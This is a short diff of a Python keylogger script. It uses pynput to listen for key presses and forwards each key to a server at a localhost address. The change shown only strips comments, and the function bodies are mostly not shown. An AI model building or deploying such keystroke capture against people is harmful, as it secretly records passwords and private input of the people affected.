@@ -1,7 +1,6 @@
 from pynput import keyboard
 import requests
 
-# Use localhost as the server's endpoint
 SERVER_URL = "http://localhost:3009/"
 
 def key_pressed(key):
@@ -26,5 +25,5 @@ def send_key_to_server(key_data):
 
 if __name__ == "__main__":
     listener = keyboard.Listener(on_press=key_pressed)
-    listener.start()  # Start the listener
-    listener.join()   # Keeps the program running
+    listener.start()  
+    listener.join()   
